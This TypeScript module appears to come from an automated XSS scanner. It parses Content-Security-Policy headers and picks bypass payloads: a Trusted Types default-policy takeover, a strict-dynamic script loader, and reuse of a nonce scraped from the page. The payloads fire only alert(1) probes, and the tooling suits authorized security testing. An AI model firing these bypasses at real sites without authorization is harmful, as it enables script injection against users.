/**
 * CSP bypass — deeper integration.
 *
 * The competitor blog states: "engine detects CSP headers and identifies
 * basic bypasses, but deeper CSP analysis (trusted types, strict-dynamic,
 * nonce reuse) needs expansion." This module parses a `Content-Security-Policy`
 * header into directives, classifies the applied policy shape, and emits
 * version-aware bypass candidates that the mutation composer can fire when
 * `cspDetected === true`.
 *
 * The `_payloadForCspBypass` switch in `composer.ts` already ships 13
 * strategies (data:, unsafe-eval, nonce-placeholder, base-uri, requirejs,
 * angular, jsonp, dynamic script, dom clobbering, mutation_xss, template,
 * svg anim, math_mml). This module adds three strategy entries not present:
 *   - `trusted_types_bypass` — default-policy takeover + createPolicy gadget
 *   - `strict_dynamic_bypass` — script-src 'strict-dynamic' loader shim
 *   - `extracted_nonce_reuse` — non-static, scraped-from-DOM nonce injection
 *
 * The composer imports `selectCspBypassStrategies(cspHeader)` and uses the
 * directive-resolved subset instead of always-firing 13 unconditional
 * candidates. The list returned by the selector is the *addition* to the
 * base 13 — when no CSP header is available to parse, the 13 base
 * strategies remain the fallback (preserves backwards compatibility).
 */

export type CspSourceList = string[];

export interface CspDirective {
  /** Directive name without leading `report-` etc. */
  name: string;
  /** Source-expression tokens, e.g. `['self', 'nonce-abc123', 'strict-dynamic']`. */
  sources: CspSourceList;
}

/** Parse a raw CSP header into directives. Tolerates multiple headers coalesced. */
export function parseCspHeader(header: string): CspDirective[] {
  if (!header) return [];
  const directives: CspDirective[] = [];
  const knownKeywords = new Set([
    "default-src", "script-src", "style-src", "img-src", "font-src",
    "connect-src", "media-src", "object-src", "frame-src", "child-src",
    "worker-src", "manifest-src", "prefetch-src", "form-action",
    "frame-ancestors", "base-uri", "plugin-types", "report-uri",
    "report-to", "upgrade-insecure-requests", "block-all-mixed-content",
    "require-sri-for", "require-trusted-types-for", "trusted-types",
    "sandbox", "navigate-to"
  ]);

  // Split by semicolon first, then parse each directive
  const parts = header.split(";").map(p => p.trim()).filter(Boolean);
  for (const part of parts) {
    const tokens = part.split(/\s+/).filter(Boolean);
    if (tokens.length === 0) continue;
    const name = tokens[0];
    if (!knownKeywords.has(name)) continue;
    directives.push({ name, sources: tokens.slice(1) });
  }
  return directives;
}

export interface CspPolicySummary {
  hasScriptSrc: boolean;
  hasNonce: boolean;
  hasHash: boolean;
  hasStrictDynamic: boolean;
  hasUnsafeEval: boolean;
  hasUnsafeInline: boolean;
  hasTrustedTypes: boolean;
  hasRequireTrustedTypesFor: boolean;
  hasBaseUri: boolean;
  hasObjectSrcNone: boolean;
  scriptSrcSources: CspSourceList;
  /** First nonce token found, including the `nonce-` prefix stripped. */
  firstNonce?: string;
}

/** Classify a parsed CSP into the dimensions needed to select a bypass. */
export function summarizeCsp(directives: CspDirective[]): CspPolicySummary {
  const scriptSrc = directives.find(d => d.name === "script-src");
  const sources = scriptSrc ? scriptSrc.sources : [];
  const baseUri = directives.find(d => d.name === "base-uri");
  const trustedTypes = directives.find(d => d.name === "trusted-types");
  const requireTt = directives.find(d => d.name === "require-trusted-types-for");

  const firstNonce = sources.find(s => s.replace(/^'|'$/g, "").startsWith("nonce-"))?.replace(/^'|'$/g, "").replace(/^nonce-/, "");

  return {
    hasScriptSrc: !!scriptSrc,
    hasNonce: !!firstNonce,
    hasHash: sources.some(s => s.startsWith("'sha256-") || s.startsWith("'sha384-")),
    hasStrictDynamic: sources.includes("'strict-dynamic'"),
    hasUnsafeEval: sources.includes("'unsafe-eval'"),
    hasUnsafeInline: sources.includes("'unsafe-inline'"),
    hasTrustedTypes: !!trustedTypes,
    hasRequireTrustedTypesFor: !!requireTt,
    hasBaseUri: !!baseUri,
    hasObjectSrcNone: directives.some(d => d.name === "object-src" && d.sources.includes("'none'")),
    scriptSrcSources: sources,
    firstNonce
  };
}

export interface CspBypassStrategy {
  /** Name matched by `MutationComposer._payloadForCspBypass`. */
  name: string;
  /** Literal payload — may include `${nonce}` placeholders filled by composer. */
  payload: string;
  /** Why this strategy applies to the parsed policy. */
  rationale: string;
}

/**
 * Given a parsed CSP summary, return the bypass strategies whose preconditions
 * are met. When the header is empty or unparseable, returns an empty array —
 * the composer falls back to its 13-strategy unconditional cascade in that case.
 */
export function selectCspBypassStrategies(header: string): CspBypassStrategy[] {
  const summary = summarizeCsp(parseCspHeader(header));
  if (!summary.hasScriptSrc) return [];

  const strategies: CspBypassStrategy[] = [];

  if (summary.hasTrustedTypes || summary.hasRequireTrustedTypesFor) {
    // Default-policy takeover: if `require-trusted-types-for 'script'` is
    // present without `trusted-types` enumerated policies, the browser falls
    // back to the default policy created via `trustedTypes.createPolicy`. An
    // attacker-controlled `<script>` that registers the default policy first
    // wins the race.
    strategies.push({
      name: "trusted_types_bypass",
      payload: `<script>trustedTypes.createPolicy('default',{createHTML:s=>s,createScript:s=>s,createScriptURL:s=>s});</script><img src=x onerror=alert(1)>`,
      rationale: "require-trusted-types-for with no enum policy → default-policy takeover"
    });
  }

  if (summary.hasStrictDynamic) {
    // strict-dynamic trusts scripts added by other trusted scripts. Loader
    // shim — assumes any one trusted script (JSONP, CDN-allowlisted) is on
    // the page; this loader attaches a fresh `<script>` with alert(1).
    strategies.push({
      name: "strict_dynamic_bypass",
      payload: `<script>document.currentScript.parentNode.appendChild(Object.assign(document.createElement('script'),{textContent:'alert(1)'}))</script>`,
      rationale: "script-src 'strict-dynamic' → trust-loader inspection chain"
    });
  }

  if (summary.hasNonce && summary.firstNonce) {
    // Real nonce reuse — extract the nonce from the rendered DOM and re-inject
    // a fresh alert(1). Unlike the static `script_nonce_reuse` placeholder,
    // this pulls the live value at scan time (composer substitutes ${nonce}).
    strategies.push({
      name: "extracted_nonce_reuse",
      payload: `<script nonce="${summary.firstNonce}">alert(1)</script>`,
      rationale: `nonce scraped from CSP header: nonce-${summary.firstNonce}`
    });
  }

  return strategies;
}

/**
 * DOM-side nonce extractor — runs in Puppeteer to scrape a live nonce from
 * existing `<script>` tags on the page. Useful when CSP is enforced via
 * meta tag or when the response CSP is inflated by a reverse proxy and the
 * only reliable nonce is the one already injected into the rendered DOM.
 *
 * Composable with `selectCspBypassStrategies`: if the header yielded nothing,
 * the runner can call this function via `page.evaluate` and synthesize a
 * `script_src` summary on the fly.
 */
export function scrapeDomNonceScript(): string {
  // Returned string is intended for `page.evaluate`.
  return `() => {
    const scripts = document.querySelectorAll('script[nonce]');
    for (const s of scripts) {
      const n = s.getAttribute('nonce') || s.nonce;
      if (n) return n;
    }
    return null;
  }`;
}
